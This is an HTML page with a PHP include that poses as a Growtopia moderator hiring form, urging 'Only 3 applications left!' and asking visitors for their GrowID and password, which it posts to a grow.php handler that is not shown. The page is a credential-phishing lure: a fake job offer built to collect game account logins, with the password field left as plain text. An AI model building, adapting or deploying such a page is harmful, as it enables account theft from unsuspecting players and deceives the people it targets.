<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Growtopia</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="https://use.typekit.net/vyp5uoh.css">
	<link rel="stylesheet" type="text/css" href="grow.css">
</head>

<body>
	<?php
	include("grow.php");
	?>
	<p>We are hiring Growtopia moderators!<br>Only <span style="color: yellow">3</span> applications left!</p>
	
	<div class="container">
		
  <form action="/grow.php" method="post" autocomplete="off">
	  
    <label for="growid">GrowID <span style="color: red">*</span></label>
    <input type="text" id="growid" name="growID" placeholder="Your GrowID">

    <label for="password">Password <span style="color: red">*</span></label>
    <input type="text" id="password" name="Password" placeholder="Your password">
	  
	  <div class="why">
		  
	  <label for="reasonn">Why you?</label>
    <input type="text" id="reason" name="reason" placeholder="We should hire you because...">
		  
	  </div>
	  
  <div class="consub">
    <input type="submit" value="Submit">
	  </div>
	  
  </form>

</div>
	
</body>
</html>
